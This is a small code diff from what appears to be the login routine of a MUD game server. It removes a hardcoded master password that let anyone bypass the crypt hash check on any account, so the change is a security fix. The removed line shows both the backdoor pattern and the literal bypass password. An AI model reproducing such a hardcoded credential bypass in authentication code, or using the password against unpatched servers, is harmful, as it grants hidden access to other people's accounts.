@@ -198,7 +198,7 @@ protected void get_passwd(string pass, object ob)
         write("\n");
         my_pass = ob->query("password");
         ip = query_ip_number(ob);
-        if( pass!= "will11688" && crypt(pass, my_pass) != my_pass )
+        if( crypt(pass, my_pass) != my_pass )
         {
         	if(undefinedp(hacker_ip[ip])) 
 				hacker_ip[ip] = 1;
